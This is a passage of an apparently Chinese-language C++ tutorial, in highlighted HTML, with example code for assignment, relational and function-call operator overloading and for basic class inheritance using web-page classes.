class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">Person(<span class="type">int</span> age)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将年龄数据开辟到堆区</span></span><br><span class="line">m_Age = new <span class="type">int</span>(age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重载赋值运算符</span></span><br><span class="line">Person&amp; operator=(Person &amp;p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m_Age != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">delete m_Age;</span><br><span class="line">m_Age = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//编译器提供的代码是浅拷贝</span></span><br><span class="line"><span class="comment">//m_Age = p.m_Age;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//提供深拷贝 解决浅拷贝的问题</span></span><br><span class="line">m_Age = new <span class="type">int</span>(*p.m_Age);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回自身</span></span><br><span class="line"><span class="keyword">return</span> *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">~Person()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m_Age != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">delete m_Age;</span><br><span class="line">m_Age = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//年龄的指针</span></span><br><span class="line"><span class="type">int</span> *m_Age;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Person <span class="title function_">p1</span><span class="params">(<span class="number">18</span>)</span>;</span><br><span class="line"></span><br><span class="line">Person <span class="title function_">p2</span><span class="params">(<span class="number">20</span>)</span>;</span><br><span class="line"></span><br><span class="line">Person <span class="title function_">p3</span><span class="params">(<span class="number">30</span>)</span>;</span><br><span class="line"></span><br><span class="line">p3 = p2 = p1; <span class="comment">//赋值操作</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1的年龄为：&quot;</span> &lt;&lt; *p1.m_Age &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2的年龄为：&quot;</span> &lt;&lt; *p2.m_Age &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p3的年龄为：&quot;</span> &lt;&lt; *p3.m_Age &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line"><span class="comment">//int a = 10;</span></span><br><span class="line"><span class="comment">//int b = 20;</span></span><br><span class="line"><span class="comment">//int c = 30;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//c = b = a;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;c = &quot; &lt;&lt; c &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-5-5-关系运算符重载">4.5.5 关系运算符重载</h4><p>**作用：**重载关系运算符，可以让两个自定义类型对象进行对比操作</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">Person(<span class="built_in">string</span> name, <span class="type">int</span> age)</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_Name = name;</span><br><span class="line">this-&gt;m_Age = age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> operator==(Person &amp; p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (this-&gt;m_Name == p.m_Name &amp;&amp; this-&gt;m_Age == p.m_Age)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> operator!=(Person &amp; p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (this-&gt;m_Name == p.m_Name &amp;&amp; this-&gt;m_Age == p.m_Age)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> m_Name;</span><br><span class="line"><span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//int a = 0;</span></span><br><span class="line"><span class="comment">//int b = 0;</span></span><br><span class="line"></span><br><span class="line">Person <span class="title function_">a</span><span class="params">(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">18</span>)</span>;</span><br><span class="line">Person <span class="title function_">b</span><span class="params">(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">18</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a == b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a和b相等&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a和b不相等&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a != b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a和b不相等&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a和b相等&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-5-6-函数调用运算符重载">4.5.6 函数调用运算符重载</h4><ul><li>函数调用运算符 ()   也可以重载</li><li>由于重载后使用的方式非常像函数的调用，因此称为仿函数</li><li>仿函数没有固定写法，非常灵活</li></ul><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPrint</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">operator</span><span class="params">()</span><span class="params">(<span class="built_in">string</span> text)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; text &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//重载的（）操作符 也称为仿函数</span></span><br><span class="line">MyPrint myFunc;</span><br><span class="line">myFunc(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyAdd</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> <span class="title function_">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> v1, <span class="type">int</span> v2)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> v1 + v2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test02</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">MyAdd add;</span><br><span class="line"><span class="type">int</span> ret = add(<span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ret = &quot;</span> &lt;&lt; ret &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//匿名对象调用</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;MyAdd()(100,100) = &quot;</span> &lt;&lt; MyAdd()(<span class="number">100</span>, <span class="number">100</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line">test02();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-6-继承">4.6   继承</h3><p><strong>继承是面向对象三大特性之一</strong></p><p>有些类与类之间存在特殊的关系</p><p>我们发现，定义这些类时，下级别的成员除了拥有上一级的共性，还有自己的特性。</p><p>这个时候我们就可以考虑利用继承的技术，减少重复代码</p><h4 id="4-6-1-继承的基本语法">4.6.1 继承的基本语法</h4><p>例如我们看到很多网站中，都有公共的头部，公共的底部，甚至公共的左侧列表，只有中心内容不同</p><p>接下来我们分别利用普通写法和继承的写法来实现网页中的内容，看一下继承存在的意义以及好处</p><p><strong>普通实现：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Java页面</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Java</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">header</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">footer</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">left</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">content</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;JAVA学科视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//Python页面</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Python</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">header</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">footer</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">left</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">content</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Python学科视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//C++页面</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CPP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">header</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">footer</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">left</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">content</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;C++学科视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//Java页面</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Java下载视频页面如下： &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">Java ja;</span><br><span class="line">ja.header();</span><br><span class="line">ja.footer();</span><br><span class="line">ja.left();</span><br><span class="line">ja.content();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Python页面</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Python下载视频页面如下： &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">Python py;</span><br><span class="line">py.header();</span><br><span class="line">py.footer();</span><br><span class="line">py.left();</span><br><span class="line">py.content();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//C++页面</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;C++下载视频页面如下： &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">CPP cp;</span><br><span class="line">cp.header();</span><br><span class="line">cp.footer();</span><br><span class="line">cp.left();</span><br><span class="line">cp.content();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>继承实现：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//公共页面</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BasePage</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">header</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">footer</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">left</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Java页面</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Java</span> :</span> public BasePage</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">content</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;JAVA学科视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//Python页面</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Python</span> :</span> public BasePage</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">content</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Python学科视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//C++页面</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CPP</span> :</span> public BasePage</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">content</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;C++学科视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//Java页面</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Java下载视频页面如下： &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">Java ja;</span><br><span class="line">ja.header();</span><br><span class="line">ja.footer();</span><br><span class="line">ja.left();</span><br><span class="line">ja.content();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Python页面</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Python下载视频页面如下： &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">Python py;</span><br><span class="line">py.header();</span><br><span class="line">py.footer();</span><br><span 